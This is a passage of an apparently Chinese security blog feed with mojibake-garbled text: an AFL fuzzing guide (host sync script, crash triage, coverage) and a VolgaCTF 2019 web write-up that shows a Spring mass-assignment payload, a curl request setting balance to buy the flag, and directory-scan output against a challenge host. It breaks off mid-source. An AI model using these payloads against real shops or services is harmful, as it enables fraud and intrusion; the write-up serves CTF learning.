class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># authorized_keysçš„æ–¹å¼è¿›è¡Œsshè®¤è¯</span></span><br><span class="line"><span class="comment"># æ‰€æœ‰è¦åŒæ­¥çš„ä¸»æœº</span></span><br><span class="line">FUZZ_HOSTS=<span class="string">'172.21.5.101 172.21.5.102'</span></span><br><span class="line"><span class="comment"># SSH user</span></span><br><span class="line">FUZZ_USER=root</span><br><span class="line"><span class="comment"># åŒæ­¥ç›®å½•</span></span><br><span class="line">SYNC_DIR=<span class="string">'/root/syncdir'</span></span><br><span class="line"><span class="comment"># åŒæ­¥é—´éš”æ—¶é—´</span></span><br><span class="line">SYNC_INTERVAL=$((30 * 60))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="string">"<span class="variable">$AFL_ALLOW_TMP</span>"</span> = <span class="string">""</span> ]; <span class="keyword">then</span></span><br><span class="line">  <span class="keyword">if</span> [ <span class="string">"<span class="variable">$PWD</span>"</span> = <span class="string">"/tmp"</span> -o <span class="string">"<span class="variable">$PWD</span>"</span> = <span class="string">"/var/tmp"</span> ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"[-] Error: do not use shared /tmp or /var/tmp directories with this script."</span> 1&gt;&amp;2</span><br><span class="line">    <span class="built_in">exit</span> 1</span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">rm -rf .sync_tmp 2&gt;/dev/null</span><br><span class="line">mkdir .sync_tmp || <span class="built_in">exit</span> 1</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> :; <span class="keyword">do</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># æ‰“åŒ…æ‰€æœ‰æœºå™¨ä¸Šçš„æ•°æ®</span></span><br><span class="line">  <span class="keyword">for</span> host <span class="keyword">in</span> <span class="variable">$FUZZ_HOSTS</span>; <span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"[*] Retrieving data from <span class="variable">$&#123;host&#125;</span>..."</span></span><br><span class="line">    ssh -o <span class="string">'passwordauthentication no'</span> <span class="variable">$&#123;FUZZ_USER&#125;</span>@<span class="variable">$&#123;host&#125;</span> \</span><br><span class="line">      <span class="string">"cd '<span class="variable">$SYNC_DIR</span>' &amp;&amp; tar -czf - SESSION*"</span> &gt;<span class="string">".sync_tmp/<span class="variable">$&#123;host&#125;</span>.tgz"</span></span><br><span class="line">  <span class="keyword">done</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># åˆ†å‘æ•°æ®</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> dst_host <span class="keyword">in</span> <span class="variable">$FUZZ_HOSTS</span>; <span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"[*] Distributing data to <span class="variable">$&#123;dst_host&#125;</span>..."</span></span><br><span class="line">    <span class="keyword">for</span> src_host <span class="keyword">in</span> <span class="variable">$FUZZ_HOSTS</span>; <span class="keyword">do</span></span><br><span class="line">      <span class="built_in">test</span> <span class="string">"<span class="variable">$src_host</span>"</span> = <span class="string">"<span class="variable">$dst_host</span>"</span> &amp;&amp; <span class="built_in">continue</span></span><br><span class="line">      <span class="built_in">echo</span> <span class="string">"    Sending fuzzer data from <span class="variable">$&#123;src_host&#125;</span>..."</span></span><br><span class="line">      ssh -o <span class="string">'passwordauthentication no'</span> <span class="variable">$&#123;FUZZ_USER&#125;</span>@<span class="variable">$dst_host</span> \</span><br><span class="line">        <span class="string">"cd '<span class="variable">$SYNC_DIR</span>' &amp;&amp; tar -xkzf - &amp;&gt;/dev/null"</span> &lt;<span class="string">".sync_tmp/<span class="variable">$&#123;src_host&#125;</span>.tgz"</span></span><br><span class="line">    <span class="keyword">done</span></span><br><span class="line">  <span class="keyword">done</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">"[+] Done. Sleeping for <span class="variable">$SYNC_INTERVAL</span> seconds (Ctrl-C to quit)."</span></span><br><span class="line">  sleep <span class="variable">$SYNC_INTERVAL</span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure><h2 id="0x02-Fuzzç»“æœåˆ†æå’Œä»£ç è¦†ç›–ç‡"><a href="#0x02-Fuzzç»“æœåˆ†æå’Œä»£ç è¦†ç›–ç‡" class="headerlink" title="0x02 Fuzzç»“æœåˆ†æå’Œä»£ç è¦†ç›–ç‡"></a>0x02 Fuzzç»“æœåˆ†æå’Œä»£ç è¦†ç›–ç‡</h2><h3 id="1-å·¥ä½œçŠ¶æ€"><a href="#1-å·¥ä½œçŠ¶æ€" class="headerlink" title="1. å·¥ä½œçŠ¶æ€"></a>1. å·¥ä½œçŠ¶æ€</h3><p>afl-fuzzæ°¸è¿œä¸ä¼šåœæ­¢ï¼Œæ‰€ä»¥ä½•æ—¶åœæ­¢æµ‹è¯•å¾ˆå¤šæ—¶å€™å°±æ˜¯ä¾é afl-fuzzæä¾›çš„çŠ¶æ€æ¥å†³å®šçš„ã€‚å…·ä½“çš„å‡ ç§æ–¹å¼å¦‚ä¸‹æ‰€ç¤º:</p><ul><li>çŠ¶æ€çª—å£çš„<code>cycles done</code>å˜ä¸ºç»¿è‰²;</li><li><code>afl-whatsup</code>æŸ¥çœ‹afl-fuzzçŠ¶æ€;</li><li><code>afl-stat</code>å¾—åˆ°ç±»ä¼¼äºafl-whatsupçš„è¾“å‡ºç»“æœ;</li><li>å®šåˆ¶<code>afl-whatsup</code>-&gt;åœ¨æ‰€æœ‰ä»£ç å¤–é¢åŠ ä¸ªå¾ªç¯å°±å¥½;</li><li>ç”¨<code>afl-plot</code>ç»˜åˆ¶å„ç§çŠ¶æ€æŒ‡æ ‡çš„ç›´è§‚å˜åŒ–è¶‹åŠ¿;</li><li><code>pythia</code>ä¼°ç®—å‘ç°æ–°crashå’Œpathæ¦‚ç‡ã€‚</li></ul><h3 id="2-fuzzç»“æŸåˆ¤æ–­"><a href="#2-fuzzç»“æŸåˆ¤æ–­" class="headerlink" title="2. fuzzç»“æŸåˆ¤æ–­"></a>2. fuzzç»“æŸåˆ¤æ–­</h3><ul><li>çŠ¶æ€çª—å£ä¸­â€cycles doneâ€å­—æ®µé¢œè‰²å˜ä¸ºç»¿è‰²è¯¥å­—æ®µçš„é¢œè‰²å¯ä»¥ä½œä¸ºä½•æ—¶åœæ­¢æµ‹è¯•çš„å‚è€ƒ;</li><li>è·ä¸Šä¸€æ¬¡å‘ç°æ–°è·¯å¾„ï¼ˆæˆ–è€…å´©æºƒï¼‰å·²ç»è¿‡å»å¾ˆé•¿æ—¶é—´äº†ï¼Œè‡³äºå…·ä½“å¤šå°‘æ—¶é—´è¿˜æ˜¯éœ€è¦è‡ªå·±æŠŠæ¡;</li><li>ç›®æ ‡ç¨‹åºçš„ä»£ç å‡ ä¹è¢«æµ‹è¯•ç”¨ä¾‹å®Œå…¨è¦†ç›–ï¼Œè¿™ç§æƒ…å†µå¥½åƒå¾ˆå°‘è§;</li><li>pythiaæä¾›çš„å„ç§æ•°æ®ä¸­ï¼Œpath coveraè¾¾åˆ°99æˆ–è€…correctnessçš„å€¼è¾¾åˆ°1e-08(å«ä¹‰: ä»ä¸Šæ¬¡å‘ç°path/uniq crashåˆ°ä¸‹ä¸€æ¬¡å‘ç°ä¹‹é—´å¤§çº¦éœ€è¦1äº¿æ¬¡æ‰§è¡Œ)</li></ul><h3 id="3-è¾“å‡ºç»“æœè¯´æ˜"><a href="#3-è¾“å‡ºç»“æœè¯´æ˜" class="headerlink" title="3. è¾“å‡ºç»“æœè¯´æ˜"></a>3. è¾“å‡ºç»“æœè¯´æ˜</h3><blockquote><p>queueï¼šå­˜æ”¾æ‰€æœ‰å…·æœ‰ç‹¬ç‰¹æ‰§è¡Œè·¯å¾„çš„æµ‹è¯•ç”¨ä¾‹ã€‚</p><p>crashesï¼šå¯¼è‡´ç›®æ ‡æ¥æ”¶è‡´å‘½signalè€Œå´©æºƒçš„ç‹¬ç‰¹æµ‹è¯•ç”¨ä¾‹ã€‚</p><p>crashes/README.txtï¼šä¿å­˜äº†ç›®æ ‡æ‰§è¡Œè¿™äº›crashæ–‡ä»¶çš„å‘½ä»¤è¡Œå‚æ•°ã€‚</p><p>hangsï¼šå¯¼è‡´ç›®æ ‡è¶…æ—¶çš„ç‹¬ç‰¹æµ‹è¯•ç”¨ä¾‹ã€‚</p><p>fuzzer_statsï¼šafl-fuzzçš„è¿è¡ŒçŠ¶æ€ã€‚</p><p>plot_dataï¼šç”¨äºafl-plotç»˜å›¾ã€‚</p></blockquote><h3 id="4-å¯¹crashç»“æœçš„ç®€å•åˆ†æå’Œåˆ†ç±»"><a href="#4-å¯¹crashç»“æœçš„ç®€å•åˆ†æå’Œåˆ†ç±»" class="headerlink" title="4. å¯¹crashç»“æœçš„ç®€å•åˆ†æå’Œåˆ†ç±»"></a>4. å¯¹crashç»“æœçš„ç®€å•åˆ†æå’Œåˆ†ç±»</h3><ol><li>crash exploration mode<br>afl-fuzzçš„ä¸€ç§è¿è¡Œæ¨¡å¼ï¼Œä¹Ÿç§°ä¸ºperuvian rabbit modeï¼Œç”¨äºç¡®å®šbugçš„å¯åˆ©ç”¨æ€§ï¼Œå…¶è¾“å…¥çš„æ˜¯crashçš„ä¿¡æ¯ï¼Œä¹‹åä½¿ç”¨<code>-C</code>å¯ç”¨è¿™ç§æ¨¡å¼ï¼Œaflä¼šè‡ªåŠ¨æ¢ç´¢å¹¶åˆ›é€ ä¸ä¹‹ç›¸å…³çš„crashæ¥å¸®åŠ©ä½ è¿›è¡Œåˆ†æï¼Œæ¯”å¦‚åˆ¤æ–­èƒ½å¤Ÿæ§åˆ¶æŸå—å†…å­˜åœ°å€çš„é•¿åº¦ã€‚</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">afl-fuzz -m none -C -i ./fuzz_out/crashes -o ./peruvian-were-rabbit_out -- ./vuln -f</span><br></pre></td></tr></table></figure><ol start="2"><li>triage_crashes.sh<br>AFLæºç çš„experimentalç›®å½•ä¸­æœ‰ä¸€ä¸ªåä¸ºtriage_crashes.shçš„è„šæœ¬ï¼Œå¯ä»¥å¸®åŠ©æˆ‘ä»¬è§¦å‘æ”¶é›†åˆ°çš„crashesã€‚</li></ol><p>ç›´æ¥ä½¿ç”¨è„šæœ¬è·Ÿå‚æ•°çš„è¯ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ç›¸å…³crashæƒ…å†µçš„å¯„å­˜å™¨ç­‰ä¿¡æ¯ï¼Œä½†æ˜¯å¦‚æœåªæ˜¯å¤§è‡´åˆ†ç±»çš„è¯ï¼Œå¯ä»¥ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/root/Desktop/fuzz/afl/experimental/crash_triage/triage_crashes.sh ./fuzz_out ./vuln 2&gt;&amp;1 | grep SIGNAL</span><br></pre></td></tr></table></figure><p>æ•ˆæœå¦‚ä¸‹ï¼Œ11ä»£è¡¨äº†SIGSEGVä¿¡å·ï¼Œæœ‰å¯èƒ½æ˜¯å› ä¸ºç¼“å†²åŒºæº¢å‡ºå¯¼è‡´è¿›ç¨‹å¼•ç”¨äº†æ— æ•ˆçš„å†…å­˜<br><img src="https://i.loli.net/2019/05/15/5cdc199e5ce5630635.png" alt="0C1CB900-EA6C-4814-A67E-1FBE5994AB87.png"></p><ol start="3"><li>crashwalk<br>ä¼˜ç‚¹:å¯ä»¥æ˜¾ç¤ºæ›´ä¸ºè¯¦ç»†çš„ä¿¡æ¯<br>é¡¹ç›®åœ°å€: <a href="https://github.com/bnagy/crashwalk" target="_blank" rel="noopener">https://github.com/bnagy/crashwalk</a></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># æ‰‹åŠ¨æ¨¡å¼</span><br><span class="line">~/go/bin/cwtriage -root ./fuzz_out/crashes -match id -- ./vuln -f</span><br><span class="line"># aflè‡ªåŠ¨åŒ–æ¨¡å¼</span><br><span class="line">~/go/bin/cwtriage -root ./fuzz_out/crashes -afl</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/05/15/5cdc1aa2edc5a77745.png" alt="6DD9C8EA-E494-4633-9F84-3F6B7959CD74.png"></p><ol start="4"><li>afl-collect</li></ol><p>é¡¹ç›®åœ°å€: <a href="https://github.com/rc0r/afl-utils" target="_blank" rel="noopener">https://github.com/rc0r/afl-utils</a><br>afl-collectåŸºäºexploitableæ¥æ£€æŸ¥crashesçš„å¯åˆ©ç”¨æ€§ã€‚å®ƒå¯ä»¥è‡ªåŠ¨åˆ é™¤æ— æ•ˆçš„crashæ ·æœ¬ã€åˆ é™¤é‡å¤æ ·æœ¬ä»¥åŠè‡ªåŠ¨åŒ–æ ·æœ¬åˆ†ç±»ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">afl-collect -j 8 -d crashes.db -e gdb_script ./fuzz_out ./fuzz_in --  ./vuln --target-opts</span><br></pre></td></tr></table></figure><p>æ•ˆæœå¦‚ä¸‹</p><p><img src="https://i.loli.net/2019/05/15/5cdc1abdd38ea24456.png" alt="D9712AE7-55FB-4A82-B974-0D418D4C85D7.png"></p><h3 id="5-ä»£ç è¦†ç›–ç‡"><a href="#5-ä»£ç è¦†ç›–ç‡" class="headerlink" title="5. ä»£ç è¦†ç›–ç‡"></a>5. ä»£ç è¦†ç›–ç‡</h3><p>åŸç†éƒ¨åˆ†å‚è€ƒ:<br><a href="https://www.freebuf.com/column/197672.html" target="_blank" rel="noopener">ã€ŠAFLæ¼æ´æŒ–æ˜æŠ€æœ¯æ¼«è°ˆï¼ˆäºŒï¼‰ï¼šFuzzç»“æœåˆ†æå’Œä»£ç è¦†ç›–ç‡ã€‹</a></p><p>afl-covçš„ä½¿ç”¨è¯´æ˜å¦‚ä¸‹:<br>é¦–å…ˆä½¿ç”¨gcové‡æ–°ç¼–è¯‘æºç </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -fprofile-arcs -ftest-coverage vuln.c -o vuln_cov</span><br></pre></td></tr></table></figure><p>å¦‚æœé‡åˆ°éœ€è¦makeè¿›è¡Œç¼–è¯‘çš„æ–‡ä»¶ï¼Œæ‰§è¡Œå¦‚ä¸‹:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ make clean</span><br><span class="line">$ ./configure --prefix=/root/tiff-4.0.10/build-cov CC=&quot;gcc&quot; CXX=&quot;g++&quot; CFLAGS=&quot;-fprofile-arcs -ftest-coverage&quot; --disable-shared</span><br><span class="line">$ make</span><br><span class="line">$ make install</span><br></pre></td></tr></table></figure><p>ä¹‹åä½¿ç”¨afl-covæ¥è®¡ç®—è¦†ç›–ç‡</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">afl-cov -d ./fuzz_out --live --enable-branch-coverage -c . -e &quot;cat AFL_FILE | ./vuln_cov AFL_FILE&quot;</span><br></pre></td></tr></table></figure><p>åŒæ—¶è¿›è¡Œå¯¹æ’æ¡©è¿‡çš„<code>vuln</code>çš„fuzz</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">afl-fuzz -i ./fuzz_in -o ./fuzz_out ./vuln -f</span><br></pre></td></tr></table></figure><p>æœ€ç»ˆæ•ˆæœå¦‚ä¸‹<br><img src="https://i.loli.net/2019/05/15/5cdc1ad66119394310.png" alt="60FD6E10-65F2-4CC1-B270-218F679D59B0.png"></p><p>ç”Ÿæˆçš„æŠ¥å‘Šä¼šä¿å­˜åœ¨<code>/path/to/afl-fuzz-output/cov/web/lcov-web-final</code>è·¯å¾„ä¸‹ã€‚</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-å‰è¨€&quot;&gt;&lt;a href=&quot;#0x00-å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;0x00 å‰è¨€&quot;&gt;&lt;/a&gt;0x00 å‰è¨€&lt;/h2&gt;&lt;p&gt;äºŒè¿›åˆ¶åˆ†ææ–¹é¢ä¸»è¦åˆ©ç”¨æŠ€æœ¯åŒ…æ‹¬ï¼šåŠ¨æ€åˆ†æ(Dynamic Analysis)ã€é™æ€åˆ†æ(Static
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>VolgaCTF 2019 Qualifier Web</title>
    <link href="http://zer0yu.github.io/2019/04/03/VolgaCTF-2019-Qualifier-Web/"/>
    <id>http://zer0yu.github.io/2019/04/03/VolgaCTF-2019-Qualifier-Web/</id>
    <published>2019-04-03T04:59:40.000Z</published>
    <updated>2019-04-03T08:33:22.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h2><p>æ¯”èµ›åœ°å€: <a href="https://q.2019.volgactf.ru/tasks" target="_blank" rel="noopener">https://q.2019.volgactf.ru/tasks</a></p><p>æ—¶é—´: æ˜ŸæœŸäº”, ä¸‰æœˆ 29, 11:00 PM (23:00) â€” æ˜ŸæœŸæ—¥, ä¸‰æœˆ 31, 11:00 PM (23:00)</p><h2 id="0x01-shop"><a href="#0x01-shop" class="headerlink" title="0x01 shop"></a>0x01 shop</h2><ol><li>ä¿¡æ¯æ³„éœ² robots.txt-&gt;shop.1.0.0.war</li><li>æ­¤å¤„æˆ‘ç›´æ¥ä½¿ç”¨ideaè‡ªåŠ¨å¯¹ä»£ç è¿›è¡Œåç¼–è¯‘ï¼Œæ¥å¯¹ä»£ç è¿›è¡Œå®¡è®¡ æ¼æ´ä¸»è¦å­˜åœ¨äºbuyçš„è·¯ç”±å¤„ï¼Œåœ¨æ­¤å¤„ä½¿ç”¨äº†spring mvcçš„<code>@ModelAttribute</code>ã€‚å®ƒçš„ä½œç”¨æ˜¯ä»modleä¸­è·å–ä¸€ä¸ªå¯¹è±¡ï¼Œç„¶åä½¿ç”¨ç”¨æˆ·çš„è¯·æ±‚requestæ¥èµ‹å€¼ï¼Œè¿™å°±é€ æˆæˆ‘ä»¬å¯ä»¥å¯¹å…¶ä¸­çš„æŸäº›å˜é‡è¿›è¡Œæ§åˆ¶ã€‚æ¼æ´ç±»å‹å±äºè‡ªåŠ¨ç»‘å®šæ¼æ´ã€‚ ä»userç±»ä¸­æˆ‘ä»¬çœ‹åˆ°å¯ä»¥æ§åˆ¶balanceã€‚(PS:è‡ªåŠ¨ç»‘å®šæ¼æ´æ˜¯è°ƒç”¨setå’Œgetæ–¹æ³•çš„å¹¶ä¸æ˜¯ç›´æ¥æ“æ§å˜é‡æˆ–è€…æ•°æ®åº“å€¼)</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Integer <span class="title">getBalance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.balance;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setBalance</span><span class="params">(Integer weight)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.balance = weight;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è€Œä»ç¨‹åºçš„æ ¡éªŒæ¥çœ‹å¦‚æœå¯ä»¥æ§åˆ¶balanceé‚£ä¹ˆå°±å¯ä»¥æ»¡è¶³æ ¡éªŒï¼Œä»è€ŒæˆåŠŸè´­ä¹°flag</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping</span>(&#123;<span class="string">"/buy"</span>&#125;)</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">buy</span><span class="params">(@RequestParam Integer productId, @ModelAttribute(<span class="string">"user"</span>)</span> User user, RedirectAttributes redir, HttpServletRequest request) </span>&#123;</span><br><span class="line">    HttpSession session = request.getSession();</span><br><span class="line">    <span class="keyword">if</span> (session.getAttribute(<span class="string">"user_id"</span>) == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"redirect:index"</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        Product product = <span class="keyword">this</span>.productDao.geProduct(productId);</span><br><span class="line">        <span class="keyword">if</span> (product != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (product.getPrice() &lt;= user.getBalance()) &#123;</span><br><span class="line">                user.setBalance(user.getBalance() - product.getPrice());</span><br><span class="line">                user.getCartItems().add(product);</span><br><span class="line">                <span class="keyword">this</span>.userDao.update(user);</span><br><span class="line">                redir.addFlashAttribute(<span class="string">"message"</span>, <span class="string">"Successful purchase"</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="string">"redirect:profile"</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            redir.addFlashAttribute(<span class="string">"message"</span>, <span class="string">"Not enough money"</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            redir.addFlashAttribute(<span class="string">"message"</span>, <span class="string">"Product not found"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">"redirect:index"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -i http://shop.q.2019.volgactf.ru/buy --cookie &quot;JSESSIONID=9C636630989A68978E11C28CCAABA31F&quot; --data &quot;productId=4&amp;balance=100000&quot; -L</span><br></pre></td></tr></table></figure><p>flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">VolgaCTF&#123;c6bc0c68f0d0dac189aa9031f8607dba&#125;</span><br></pre></td></tr></table></figure><h2 id="0x02-HeadHunter"><a href="#0x02-HeadHunter" class="headerlink" title="0x02 HeadHunter"></a>0x02 HeadHunter</h2><h2 id="0x03-Gallery"><a href="#0x03-Gallery" class="headerlink" title="0x03 Gallery"></a>0x03 Gallery</h2><ol><li>è¿›è¡Œä¿¡æ¯æ”¶é›† ä½¿ç”¨dirsearchæ”¶é›†åˆ°å¦‚ä¸‹ä¿¡æ¯</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">[22:14:44] 301 -  194B  - /js  -&gt;  http://142.93.204.169/js/</span><br><span class="line">[22:18:24] 403 -    0B  - /api/error_log</span><br><span class="line">[22:18:24] 403 -    0B  - /api/</span><br><span class="line">[22:18:24] 200 -   35B  - /api</span><br><span class="line">[22:18:24] 200 -   35B  - /apibuild.pyc</span><br><span class="line">[22:19:20] 301 -  194B  - /css  -&gt;  http://142.93.204.169/css/</span><br><span class="line">[22:20:09] 301 -  194B  - /js  -&gt;  http://142.93.204.169/js/</span><br><span class="line">[22:20:18] 200 -    3KB - /login</span><br><span class="line">[22:20:18] 200 -    3KB - /login.cgi</span><br><span class="line">[22:20:18] 200 -    3KB - /login.html</span><br><span class="line">[22:20:18] 200 -    3KB - /login.jsp</span><br><span class="line">[22:20:18] 200 -    3KB - /login.js</span><br><span class="line">[22:20:18] 200 -    3KB - /login.php</span><br><span class="line">[22:20:18] 200 -    3KB - /login.pl</span><br><span class="line">[22:20:19] 200 -    3KB - /login.rb</span><br><span class="line">[22:20:19] 200 -    3KB - /login.shtml</span><br><span class="line">[22:20:19] 200 -    3KB - /login.py</span><br><span class="line">[22:20:19] 200 -    3KB - /login.srf</span><br><span class="line">[22:20:19] 200 -    3KB - /login/</span><br><span class="line">[22:20:19] 200 -    3KB - /login/admin/</span><br><span class="line">[22:20:19] 200 -    3KB - /login/cpanel/</span><br><span class="line">[22:20:19] 200 -    3KB - /login/cpanel.js</span><br><span class="line">[22:20:19] 200 -    3KB - /login.htm</span><br><span class="line">[22:20:19] 200 -    3KB - /login/oauth/</span><br><span class="line">[22:20:19] 200 -    3KB - /login_admin.js</span><br><span class="line">[22:20:19] 200 -    3KB - /login_admin</span><br><span class="line">[22:20:19] 200 -    3KB - /logins.txt</span><br><span class="line">[22:20:20] 200 -    3KB - /login/administrator/</span><br><span class="line">[22:20:43] 200 -  459B  - /package.json</span><br><span class="line">[22:21:18] 301 -  194B  - /sessions  -&gt;  http://142.93.204.169/sessions/</span><br><span class="line">[22:21:18] 200 -  169B  - /sessions/</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹<code>/js/</code>å¯ä»¥åˆ—å‡ºå½“å‰ç«™ç‚¹çš„æ–‡ä»¶</p><p><img src="https://i.loli.net/2019/04/03/5ca43e6e70334.png" alt="3DE72E1C-10EE-467F-9B32-2FFAA471CBD0.png"></p><p>ç”±ä»¥ä¸Šä¿¡æ¯åŸºæœ¬å¯ä»¥åˆ¤æ–­å‡ºç›®æ ‡ç«™ç‚¹æ˜¯ä¸€ä¸ªnode.jså¼€å‘çš„ç«™ç‚¹</p><ol><li>æºç åˆ†æ é¦–å…ˆçœ‹ä¸€ä¸‹<code>index.js</code>çš„æºç ï¼Œé¦–å…ˆå¯ä»¥çœ‹åˆ°æ˜¯åŸºäºexpressæ¡†æ¶å¼€å‘çš„,<code>${config.apiPrefix}/login</code>,<code>${config.apiPrefix}/logout</code>, <code>${config.apiPrefix}/flag</code>æ˜¯å®ç°çš„ä¸‰ä¸ªæ¥å£ï¼Œå¦‚æœæƒ³è¯»flagçš„è¯ï¼Œä½ çš„sessionå¿…é¡»æ˜¯admin</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express    = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">const</span> session = <span class="built_in">require</span>(<span class="string">'express-session'</span>);</span><br><span class="line"><span class="keyword">const</span> store = <span class="built_in">require</span>(<span class="string">'session-file-store'</span>)(session);</span><br><span class="line"><span class="keyword">const</span> proxy = <span class="built_in">require</span>(<span class="string">'http-proxy-middleware'</span>);</span><br><span class="line"><span class="keyword">const</span> parser = <span class="built_in">require</span>(<span class="string">'body-parser'</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"><span 